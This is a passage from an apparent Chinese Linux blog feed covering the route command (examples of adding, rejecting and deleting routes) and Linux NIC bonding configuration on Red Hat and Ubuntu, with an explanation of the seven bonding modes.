class="shell">Add&#xFF1A;&#x589E;&#x52A0;&#x6307;&#x5B9A;&#x7684;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#xFF1B;Del&#xFF1A;&#x5220;&#x9664;&#x6307;&#x5B9A;&#x7684;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#xFF1B;Target&#xFF1A;&#x76EE;&#x7684;&#x7F51;&#x7EDC;&#x6216;&#x76EE;&#x7684;&#x4E3B;&#x673A;&#xFF1B;gw&#xFF1A;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#xFF1B;mss&#xFF1A;&#x8BBE;&#x7F6E;TCP&#x7684;&#x6700;&#x5927;&#x533A;&#x5757;&#x957F;&#x5EA6;&#xFF08;MSS&#xFF09;&#xFF0C;&#x5355;&#x4F4D;MB&#xFF1B;window&#xFF1A;&#x6307;&#x5B9A;&#x901A;&#x8FC7;&#x8DEF;&#x7531;&#x8868;&#x7684;TCP&#x8FDE;&#x63A5;&#x7684;TCP&#x7A97;&#x53E3;&#x5927;&#x5C0F;&#xFF1B;dev&#xFF1A;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#x6240;&#x8868;&#x793A;&#x7684;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x3002;</code></pre><h3 id="&#x5B9E;&#x4F8B;"><a href="#&#x5B9E;&#x4F8B;" class="headerlink" title="&#x5B9E;&#x4F8B;"></a>&#x5B9E;&#x4F8B;</h3><p> <strong>&#x663E;&#x793A;&#x5F53;&#x524D;&#x8DEF;&#x7531;&#xFF1A;</strong> </p><pre><code class="shell">[root@localhost ~]# routeKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface112.124.12.0    *               255.255.252.0   U     0      0        0 eth110.160.0.0      *               255.255.240.0   U     0      0        0 eth0192.168.0.0     10.160.15.247   255.255.0.0     UG    0      0        0 eth0172.16.0.0      10.160.15.247   255.240.0.0     UG    0      0        0 eth010.0.0.0        10.160.15.247   255.0.0.0       UG    0      0        0 eth0default         112.124.15.247  0.0.0.0         UG    0      0        0 eth1[root@localhost ~]# route -nKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Iface112.124.12.0    0.0.0.0         255.255.252.0   U     0      0        0 eth110.160.0.0      0.0.0.0         255.255.240.0   U     0      0        0 eth0192.168.0.0     10.160.15.247   255.255.0.0     UG    0      0        0 eth0172.16.0.0      10.160.15.247   255.240.0.0     UG    0      0        0 eth010.0.0.0        10.160.15.247   255.0.0.0       UG    0      0        0 eth00.0.0.0         112.124.15.247  0.0.0.0         UG    0      0        0 eth1</code></pre><p>&#x5176;&#x4E2D;Flags&#x4E3A;&#x8DEF;&#x7531;&#x6807;&#x5FD7;&#xFF0C;&#x6807;&#x8BB0;&#x5F53;&#x524D;&#x7F51;&#x7EDC;&#x8282;&#x70B9;&#x7684;&#x72B6;&#x6001;&#xFF0C;Flags&#x6807;&#x5FD7;&#x8BF4;&#x660E;&#xFF1A;</p><ul><li>U Up&#x8868;&#x793A;&#x6B64;&#x8DEF;&#x7531;&#x5F53;&#x524D;&#x4E3A;&#x542F;&#x52A8;&#x72B6;&#x6001;&#x3002;</li><li>H Host&#xFF0C;&#x8868;&#x793A;&#x6B64;&#x7F51;&#x5173;&#x4E3A;&#x4E00;&#x4E3B;&#x673A;&#x3002;</li><li>G Gateway&#xFF0C;&#x8868;&#x793A;&#x6B64;&#x7F51;&#x5173;&#x4E3A;&#x4E00;&#x8DEF;&#x7531;&#x5668;&#x3002;</li><li>R Reinstate Route&#xFF0C;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x8DEF;&#x7531;&#x91CD;&#x65B0;&#x521D;&#x59CB;&#x5316;&#x7684;&#x8DEF;&#x7531;&#x3002;</li><li>D Dynamically,&#x6B64;&#x8DEF;&#x7531;&#x662F;&#x52A8;&#x6001;&#x6027;&#x5730;&#x5199;&#x5165;&#x3002;</li><li>M Modified&#xFF0C;&#x6B64;&#x8DEF;&#x7531;&#x662F;&#x7531;&#x8DEF;&#x7531;&#x5B88;&#x62A4;&#x7A0B;&#x5E8F;&#x6216;&#x5BFC;&#x5411;&#x5668;&#x52A8;&#x6001;&#x4FEE;&#x6539;&#x3002;</li><li><p>! &#x8868;&#x793A;&#x6B64;&#x8DEF;&#x7531;&#x5F53;&#x524D;&#x4E3A;&#x5173;&#x95ED;&#x72B6;&#x6001;&#x3002;</p><p><strong>&#x6DFB;&#x52A0;&#x7F51;&#x5173;/&#x8BBE;&#x7F6E;&#x7F51;&#x5173;&#xFF1A;</strong> </p></li></ul><pre><code class="shell">route add -net 224.0.0.0 netmask 240.0.0.0 dev eth0    #&#x589E;&#x52A0;&#x4E00;&#x6761;&#x5230;&#x8FBE;244.0.0.0&#x7684;&#x8DEF;&#x7531;&#x3002;</code></pre><p> <strong>&#x5C4F;&#x853D;&#x4E00;&#x6761;&#x8DEF;&#x7531;&#xFF1A;</strong> </p><pre><code class="shell">route add -net 224.0.0.0 netmask 240.0.0.0 reject     #&#x589E;&#x52A0;&#x4E00;&#x6761;&#x5C4F;&#x853D;&#x7684;&#x8DEF;&#x7531;&#xFF0C;&#x76EE;&#x7684;&#x5730;&#x5740;&#x4E3A;224.x.x.x&#x5C06;&#x88AB;&#x62D2;&#x7EDD;&#x3002;</code></pre><p> <strong>&#x5220;&#x9664;&#x8DEF;&#x7531;&#x8BB0;&#x5F55;&#xFF1A;</strong> </p><pre><code class="shell">route del -net 224.0.0.0 netmask 240.0.0.0route del -net 224.0.0.0 netmask 240.0.0.0 reject</code></pre><p> <strong>&#x5220;&#x9664;&#x548C;&#x6DFB;&#x52A0;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#xFF1A;</strong> </p><pre><code class="shell">route del default gw 192.168.120.240route add default gw 192.168.120.240</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;route&quot;&gt;&lt;a href=&quot;#route&quot; class=&quot;headerlink&quot; title=&quot;route&quot;&gt;&lt;/a&gt;route&lt;/h1&gt;&lt;p&gt;&amp;#x663E;&amp;#x793A;&amp;#x5E76;&amp;#x8BBE;&amp;#x7F6E;Linux&amp;#x4E2D;&amp;#x97
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux网卡聚合及bond模式的原理</title>
    <link href="https://marnm.github.io//posts/f20e14fd/"/>
    <id>https://marnm.github.io//posts/f20e14fd/</id>
    <published>2022-06-07T04:40:22.000Z</published>
    <updated>2022-06-07T05:20:35.218Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux&#x7F51;&#x5361;&#x805A;&#x5408;&#x914D;&#x7F6E;"><a href="#Linux&#x7F51;&#x5361;&#x805A;&#x5408;&#x914D;&#x7F6E;" class="headerlink" title="Linux&#x7F51;&#x5361;&#x805A;&#x5408;&#x914D;&#x7F6E;"></a>Linux&#x7F51;&#x5361;&#x805A;&#x5408;&#x914D;&#x7F6E;</h2><h3 id="bonding"><a href="#bonding" class="headerlink" title="bonding"></a>bonding</h3><h4 id="Redhat&#x7CFB;&#x5217;"><a href="#Redhat&#x7CFB;&#x5217;" class="headerlink" title="Redhat&#x7CFB;&#x5217;"></a>Redhat&#x7CFB;&#x5217;</h4><p>&#x6DFB;&#x52A0;2&#x5757;&#x7269;&#x7406;&#x7F51;&#x5361;<br>&#x4FEE;&#x6539;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;</p><blockquote><p>&#x9ED8;&#x8BA4;&#x7F51;&#x5361;&#x4EE5;ifcfg-ens33&#x4E3A;&#x4F8B;</p><pre><code class="bash">cd /etc/sysconfig/network-scripts/cp ifcfg-ens33 ifcfg-bond_staticcp ifcfg-ens33 ifcfg-ens38echo &gt; ifcfg-bond_static</code></pre><p>&#x4FEE;&#x6539;&#x7269;&#x7406;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br><code>`</code>bash<br>vim ifcfg-ens33<br>TYPE=Ethernet<br>BOOTPROT=none<br>DEVICE=ens33<br>NAME=ens33<br>ONBOOT=yes<br>MASTER=bond_static  # &#x4E3B;&#x7F51;&#x5361;=bong_static<br>SLAVE=yes   # &#x4ECE;&#x7F51;&#x5361;=yes</p></blockquote><pre><code>----```bashvim ifcfg-ens38TYPE=EthernetBOOTPROTO=noneDEVICE=ens38NAME=ens38ONBOOT=yesMASTER=bond_staticSLAVE=yes</code></pre><p>&#x4FEE;&#x6539;bond&#x914D;&#x7F6E;</p><pre><code class="bash">vim ifcfg-bond_staticTYPE=EthernetBOOTPROTO=staticDEVICE=bond_staticNAME=bond_staticIPADDR=192.168.x.xPREFIX=24GATEWAY=192.168.X.XDNS1=X.X.X.XDNS2=X.X.X.XONBOOT=yesBONDING_MASTER=yes  # &#x662F;&#x5426;&#x4E3B;&#x7F51;&#x5361;=yesBONDING_OPTS=&quot;miimon=100 mode=6&quot;    # MII&#x76D1;&#x63A7;&#x65F6;&#x95F4;&#x95F4;&#x9694;=100&#x6BEB;&#x79D2;&#xFF0C;&#x7ED1;&#x5B9A;&#x6A21;&#x5F0F;=6</code></pre><h4 id="Debian&#x7CFB;&#x5217;"><a href="#Debian&#x7CFB;&#x5217;" class="headerlink" title="Debian&#x7CFB;&#x5217;"></a>Debian&#x7CFB;&#x5217;</h4><blockquote><p>&#x4EE5;Ubuntu 20.04&#x4E3A;&#x4F8B;<br><strong>&#x6DFB;&#x52A0;2&#x5757;&#x7269;&#x7406;&#x7F51;&#x5361;</strong><br>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF1A;<br>sudo vim /etc/netplan/01-network-manager-all.yaml<br><code>`</code>yaml<br>version: 2<br>  renderer: NetworkManager<br>  ethernets:<br>          ens33:<br>                  dhcp4: no<br>          ens38:<br>                  dhcp4: no</p></blockquote><p>  bonds:</p><pre><code>  # bond&#x540D;&#x79F0;  bond-stat:          interfaces: [ens33, ens38]        # &#x6DFB;&#x52A0;&#x7684;2&#x5757;&#x7269;&#x7406;&#x7F51;&#x5361;          addresses: [192.168.73.20/24]     # &#x5730;&#x5740;          gateway4: 192.168.73.2        # &#x7F51;&#x5173;          nameservers:      # DNS&#x670D;&#x52A1;&#x5668;            addresses: [114.114.114.114, 192.168.73.2]          routes:   # &#x8DEF;&#x7531;                  - to: default                    via: 192.168.73.2          parameters:                     mode: active-backup       # &#x7ED1;&#x5B9A;&#x6A21;&#x5F0F;                  mii-monitor-interval: 1       # MII&#x76D1;&#x63A7;&#x65F6;&#x95F4;&#x95F4;&#x9694;</code></pre><pre><code>&#x5E94;&#x7528;&#x914D;&#x7F6E;```bashsudo netplan apply</code></pre><h4 id="bonding&#x7684;7&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;"><a href="#bonding&#x7684;7&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;" class="headerlink" title="bonding&#x7684;7&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;"></a><strong>bonding&#x7684;7&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;</strong></h4><ul><li><strong>0&#xFF0C;(balance-rr)Round-robin-policy&#xFF0C;&#x5E73;&#x8861;&#x8F6E;&#x8BE2;&#x7B56;&#x7565;</strong>&#xFF0C;<br>&#x7279;&#x70B9;&#xFF1A;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x5305;&#x987A;&#x5E8F;&#x662F;&#x4F9D;&#x6B21;&#x4F20;&#x8F93;&#xFF08;&#x5373;&#xFF1A;&#x7B2C;1&#x4E2A;&#x5305;&#x8D70;eth0&#xFF0C;&#x4E0B;&#x4E00;&#x4E2A;&#x5305;&#x5C31;&#x8D70;eth1&#x2026;.&#x4E00;&#x76F4;&#x5FAA;&#x73AF;&#x4E0B;&#x53BB;&#xFF0C;&#x76F4;&#x5230;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x4F20;&#x8F93;&#x5B8C;&#x6BD5;&#xFF09;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x63D0;&#x4F9B;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#x548C;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#xFF1B;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x8FDE;&#x63A5;&#x6216;&#x8005;&#x4F1A;&#x8BDD;&#x7684;&#x6570;&#x636E;&#x5305;&#x4ECE;&#x4E0D;&#x540C;&#x7684;&#x63A5;&#x53E3;&#x53D1;&#x51FA;&#x7684;&#x8BDD;&#xFF0C;&#x4E2D;&#x9014;&#x518D;&#x7ECF;&#x8FC7;&#x4E0D;&#x540C;&#x7684;&#x94FE;&#x8DEF;&#xFF0C;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x5305;&#x65E0;&#x5E8F;&#x5230;&#x8FBE;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x800C;&#x65E0;&#x5E8F;&#x5230;&#x8FBE;&#x7684;&#x6570;&#x636E;&#x5305;&#x9700;&#x8981;&#x91CD;&#x65B0;&#x8981;&#x6C42;&#x88AB;&#x53D1;&#x9001;&#xFF0C;&#x8FD9;&#x6837;&#x7F51;&#x7EDC;&#x7684;&#x541E;&#x5410;&#x91CF;&#x5C31;&#x4F1A;&#x4E0B;&#x964D;<ul><li><strong>1&#xFF0C;(active-backup)Active-backup policy&#xFF0C;&#x4E3B;-&#x5907;&#x4EFD;&#x7B56;&#x7565;&#xFF0C;</strong><br>&#x7279;&#x70B9;&#xFF1A;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x8BBE;&#x5907;&#x5904;&#x4E8E;&#x6D3B;&#x52A8;&#x72B6;&#x6001;&#xFF0C;&#x5F53;&#x4E00;&#x4E2A;&#x5B95;&#x6389;&#x53E6;&#x4E00;&#x4E2A;&#x9A6C;&#x4E0A;&#x7531;&#x5907;&#x4EFD;&#x8F6C;&#x6362;&#x4E3A;&#x4E3B;&#x8BBE;&#x5907;&#x3002;mac&#x5730;&#x5740;&#x662F;&#x5916;&#x90E8;&#x53EF;&#x89C1;&#x5F97;&#xFF0C;&#x4ECE;&#x5916;&#x9762;&#x770B;&#x6765;&#xFF0C;bond&#x7684;MAC&#x5730;&#x5740;&#x662F;&#x552F;&#x4E00;&#x7684;&#xFF0C;&#x4EE5;&#x907F;&#x514D;switch(&#x4EA4;&#x6362;&#x673A;)&#x53D1;&#x751F;&#x6DF7;&#x4E71;&#x3002;&#x6B64;&#x6A21;&#x5F0F;&#x53EA;&#x63D0;&#x4F9B;&#x4E86;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#xFF1B;&#x7531;&#x6B64;&#x53EF;&#x89C1;&#x6B64;&#x7B97;&#x6CD5;&#x7684;&#x4F18;&#x70B9;&#x662F;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x9AD8;&#x7F51;&#x7EDC;&#x8FDE;&#x63A5;&#x7684;&#x53EF;&#x7528;&#x6027;&#xFF0C;&#x4F46;&#x662F;&#x5B83;&#x7684;&#x8D44;&#x6E90;&#x5229;&#x7528;&#x7387;&#x8F83;&#x4F4E;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x63A5;&#x53E3;&#x5904;&#x4E8E;&#x5DE5;&#x4F5C;&#x72B6;&#x6001;&#xFF0C;&#x5728;&#x6709; N &#x4E2A;&#x7F51;&#x7EDC;&#x63A5;&#x53E3;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8D44;&#x6E90;&#x5229;&#x7528;&#x7387;&#x4E3A;1/N</li><li><strong>2&#xFF0C;(balance-xor)XOR policy&#xFF0C;&#x5E73;&#x8861;&#x7B56;&#x7565;</strong>&#xFF0C;&#x57FA;&#x4E8E;&#x6307;&#x5B9A;&#x7684;&#x4F20;&#x8F93;HASH&#x7B56;&#x7565;&#x4F20;&#x8F93;&#x6570;&#x636E;&#x5305;&#x3002;&#x7F3A;&#x7701;&#x7684;&#x7B56;&#x7565;&#x662F;(&#x6E90;MAC&#x5730;&#x5740; XOR &#x76EE;&#x6807;MAC&#x5730;&#x5740;)%slave&#x6570;&#x91CF;&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x4F20;&#x8F93;&#x7B56;&#x7565;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;xmit_hash_policy&#x9009;&#x9879;&#x6307;&#x5B9A;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x63D0;&#x4F9B;&#x8D1F;&#x8F7D;&#x5E73;&#x8861;&#x548C;&#x5BB9;&#x9519;&#x80FD;&#x529B;&#xFF09;</li><li><strong>3&#xFF0C;broadcast&#x5E7F;&#x64AD;&#x7B56;&#x7565;</strong>&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;slave&#x63A5;&#x53E3;&#x4E0A;&#x4F20;&#x8F93;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5305;&#xFF0C;&#x6B64;&#x6A21;&#x5F0F;&#x63D0;&#x4F9B;&#x4E86;&#x5BB9;&#x9519;&#x80FD;&#x529B;</li><li><strong>4&#xFF0C;(802.3ad)IEEE 802.3ad Dynamic link aggregation&#xFF08;IEEE 802.3ad&#x52A8;&#x6001;&#x94FE;&#x8DEF;&#x805A;&#x5408;&#xFF09;</strong>&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x805A;&#x5408;&#x7EC4;&#xFF0C;&#x5B83;&#x4EEC;&#x5171;&#x4EAB;&#x540C;&#x6837;&#x7684;&#x7684;&#x901F;&#x7387;&#x548C;&#x53CC;&#x5DE5;&#x8BBE;&#x5B9A;&#x3002;&#x6839;&#x636E;802.3ad&#x89C4;&#x8303;&#x5C06;&#x591A;&#x4E2A;slave&#x5DE5;&#x4F5C;&#x548B;&#x540C;&#x4E00;&#x4E2A;&#x6FC0;&#x6D3B;&#x7684;&#x805A;&#x5408;&#x4F53;&#x4E0B;&#xFF0C;&#x5916;&#x51FA;&#x6D41;&#x91CF;&#x7684;slave&#x9009;&#x4E3E;&#x662F;&#x57FA;&#x4E8E;&#x4F20;&#x8F93;hash&#x7B56;&#x7565;&#xFF0C;&#x8BE5;&#x7B56;&#x7565;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;xmit_hash_policy&#x9009;&#x7EBF;&#x4ECE;&#x7F3A;&#x7701;&#x7684;XOR&#x7B56;&#x7565;&#x6539;&#x53D8;&#x5230;&#x5176;&#x4ED6;&#x7B56;&#x7565;&#xFF0C;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x6240;&#x6709;&#x7684;&#x9664;&#x6570;&#x7B56;&#x7565;&#x90FD;&#x662F;802.3ad&#x9002;&#x5E94;&#x7684;&#xFF0C;&#x5C24;&#x5176;&#x8003;&#x8651;&#x5230;&#x5728;802.3ad&#x6807;&#x51C6;&#x7684;43.2.4&#x7AE0;&#x8282;&#x63D0;&#x53CA;&#x7684;&#x5305;&#x4E71;&#x5E8F;&#x95EE;&#x9898;&#x3002;&#x4E0D;&#x540C;&#x7684;&#x662F;&#x5B9E;&#x73B0;&#x53EF;&#x80FD;&#x4F1A;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x9002;&#x5E94;&#x6027;&#x3002;<ul><li>&#x5FC5;&#x987B;&#x8981;&#x6761;&#x4EF6;&#xFF1A;<ul><li>&#x6761;&#x4EF6;1&#xFF1A;ethtool&#x652F;&#x6301;&#x83B7;&#x53D6;&#x6BCF;&#x4E2A;slave&#x7684;&#x901F;&#x7387;&#x548C;&#x53CC;&#x5DE5;&#x8BBE;&#x5B9A;</li><li>&#x6761;&#x4EF6;2&#xFF1A;switch&#x4EA4;&#x6362;&#x673A;&#x652F;&#x6301;IEEE 802.3ad Dynamic link aggregation</li><li>&#x6761;&#x4EF6;3&#xFF1A;&#x5927;&#x591A;&#x6570;switch&#x9700;&#x8981;&#x7ECF;&#x8FC7;&#x7279;&#x5B9A;&#x914D;&#x7F6E;&#x624D;&#x80FD;&#x652F;&#x6301;802.3ad&#x6A21;&#x5F0F;</li></ul></li></ul></li><li><strong>5&#xFF0C;(balance-tlb)Adaptive transmit load balancing&#x9002;&#x914D;&#x5668;&#x4F20;&#x8F93;&#x8D1F;&#x8F7D;&#x5747;&#x8861;</strong>&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;&#x7279;&#x522B;&#x7684;switch&#x652F;&#x6301;&#x7684;&#x901A;&#x9053;bonding&#xFF0C;&#x5728;&#x6BCF;&#x4E2A;slave&#x4E0A;&#x6839;&#x636E;&#x5F53;&#x524D;&#x7684;&#x8D1F;&#x8F7D;&#xFF08;&#x6839;&#x636E;&#x901F;&#x5EA6;&#x8BA1;&#x7B97;&#xFF09;&#x5206;&#x914D;&#x5916;&#x51FA;&#x6D41;&#x91CF;&#xFF0C;&#x5982;&#x679C;&#x6B63;&#x5728;&#x63A5;&#x53D7;&#x6570;&#x636E;&#x7684;slave&#x51FA;&#x6545;&#x969C;&#x4E86;&#xFF0C;&#x53E6;&#x4E00;&#x4E2A;slave&#x63A5;&#x7BA1;&#x5931;&#x8D25;&#x7684;slave&#x7684;MAC&#x5730;&#x5740;<ul><li>&#x8BE5;&#x6A21;&#x5F0F;&#x7684;&#x5FC5;&#x8981;&#x6761;&#x4EF6;&#xFF1A;ethtool&#x652F;&#x6301;&#x83B7;&#x53D6;&#x6BCF;&#x4E2A;slave&#x7684;&#x901F;&#x7387;</li></ul></li><li><strong>6&#xFF0C;(balance-alb)Adaptive load balancing&#x9002;&#x914D;&#x5668;&#x9002;&#x5E94;&#x6027;&#x8D1F;&#x8F7D;&#x5747;&#x8861;</strong>&#xFF0C;&#x8BE5;&#x6A21;&#x5F0F;&#x5305;&#x542B;&#x4E86;balance=tlb&#x6A21;&#x5F0F;&#xFF0C;&#x540C;&#x65F6;&#x52A0;&#x4E0A;&#x9488;&#x5BF9;IPv4&#x6D41;&#x91CF;&#x7684;&#x63A5;&#x6536;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#xFF08;receiveload balance&#xFF0C;rlb&#xFF09;&#xFF0C;&#x800C;&#x4E14;&#x4E0D;&#x9700;&#x8981;&#x4EFB;&#x4F55;switch&#x7684;&#x652F;&#x6301;&#xFF0C;&#x63A5;&#x6536;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x662F;&#x901A;&#x8FC7;ARP&#x534F;&#x5546;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;bonding&#x9A71;&#x52A8;&#x622A;&#x83B7;&#x672C;&#x673A;&#x7684;ARP&#x5E94;&#x7B54;&#xFF0C;&#x5E76;&#x628A;&#x6E90;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x6539;&#x5199;&#x4E3A;bood&#x4E2D;&#x67D0;&#x4E2A;salve&#x7684;&#x552F;&#x4E00;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4ECE;&#x800C;&#x4F7F;&#x5F97;&#x4E0D;&#x540C;&#x7684;&#x5BF9;&#x7AEF;&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x8FDB;&#x884C;&#x901A;&#x4FE1;&#x3002;<br>&#x6765;&#x81EA;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x7684;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x4E5F;&#x4F1A;&#x88AB;&#x5747;&#x8861;&#x3002;&#x5F53;&#x672C;&#x673A;&#x53D1;&#x9001;ARP&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;bonding&#x9A71;&#x52A8;&#x628A;&#x5BF9;&#x7AEF;&#x7684;IP&#x4FE1;&#x606F;&#x4ECE;ARP&#x5305;&#x4E2D;&#x590D;&#x5236;&#x5E76;&#x4FDD;&#x5B58;&#x4E0B;&#x6765;&#x3002;&#x5F53;ARP&#x5E94;&#x7B54;&#x4ECE;&#x5BF9;&#x7AEF;&#x5230;&#x8FBE;&#x65F6;&#xFF0C;bonding&#x9A71;&#x52A8;&#x628A;&#x5B83;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#xFF0C;&#x5E76;&#x53D1;&#x8D77;&#x4E00;&#x4E2A;ARP&#x5E94;&#x7B54;&#x7ED9;bond&#x4E2D;&#x7684;&#x67D0;&#x4E2A;slave&#x3002;&#x4F7F;&#x7528;ARP&#x534F;&#x5546;&#x8FDB;&#x884C;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x7684;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#x662F;&#xFF1A;&#x6BCF;&#x6B21;&#x5E7F;&#x64AD; ARP&#x8BF7;&#x6C42;&#x65F6;&#x90FD;&#x4F1A;&#x4F7F;&#x7528;bond&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x56E0;&#x6B64;&#x5BF9;&#x7AEF;&#x5B66;&#x4E60;&#x5230;&#x8FD9;&#x4E2A;&#x786C;&#x4EF6;&#x5730;&#x5740;&#x540E;&#xFF0C;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x5C06;&#x4F1A;&#x5168;&#x90E8;&#x6D41;&#x5411;&#x5F53;&#x524D;&#x7684;slave&#x3002;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7ED9;&#x6240;&#x6709;&#x7684;&#x5BF9;&#x7AEF;&#x53D1;&#x9001;&#x66F4;&#x65B0;&#xFF08;ARP&#x5E94;&#x7B54;&#xFF09;&#x6765;&#x89E3;&#x51B3;&#xFF0C;&#x5E94;&#x7B54;&#x4E2D;&#x5305;&#x542B;&#x4ED6;&#x4EEC;&#x72EC;&#x4E00;&#x65E0;&#x4E8C;&#x7684;&#x786C;&#x4EF6;&#x5730;&#x5740;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4;&#x6D41;&#x91CF;&#x91CD;&#x65B0;&#x5206;&#x5E03;&#x3002;&#x5F53;&#x65B0;&#x7684;slave&#x52A0;&#x5165;&#x5230;bond&#x4E2D;&#x65F6;&#xFF0C;&#x6216;&#x8005;&#x67D0;&#x4E2A;&#x672A;&#x6FC0;&#x6D3B;&#x7684;slave&#x91CD;&#x65B0; &#x6FC0;&#x6D3B;&#x65F6;&#xFF0C;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x4E5F;&#x8981;&#x91CD;&#x65B0;&#x5206;&#x5E03;&#x3002;&#x63A5;&#x6536;&#x7684;&#x8D1F;&#x8F7D;&#x88AB;&#x987A;&#x5E8F;&#x5730;&#x5206;&#x5E03;&#xFF08;roundrobin&#xFF09;&#x5728;bond&#x4E2D;&#x6700;&#x9AD8;&#x901F;&#x7684;slave&#x4E0A;&#x5F53;&#x67D0;&#x4E2A;&#x94FE;&#x8DEF;&#x88AB;&#x91CD;&#x65B0;&#x63A5;&#x4E0A;&#xFF0C;&#x6216;&#x8005;&#x4E00;&#x4E2A;&#x65B0;&#x7684;slave&#x52A0;&#x5165;&#x5230;bond&#x4E2D;&#xFF0C;&#x63A5;&#x6536;&#x6D41;&#x91CF;&#x5728;&#x6240;&#x6709;&#x5F53;&#x524D;&#x6FC0;&#x6D3B;&#x7684;slave&#x4E2D;&#x5168;&#x90E8;&#x91CD;&#x65B0;&#x5206;&#x914D;&#xFF0C;&#x901A;&#x8FC7;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;MAC&#x5730;&#x5740;&#x7ED9;&#x6BCF;&#x4E2A; client&#x53D1;&#x8D77;ARP&#x5E94;&#x7B54;&#x3002;&#x4E0B;&#x9762;&#x4ECB;&#x7ECD;&#x7684;updelay&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A;&#x67D0;&#x4E2A;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;switch(&#x4EA4;&#x6362;&#x673A;)&#x8F6C;&#x53D1;&#x5EF6;&#x65F6;&#x7684;&#x503C;&#xFF0C;&#x4ECE;&#x800C;&#x4FDD;&#x8BC1;&#x53D1;&#x5F80;&#x5BF9;&#x7AEF;&#x7684;ARP&#x5E94;&#x7B54; 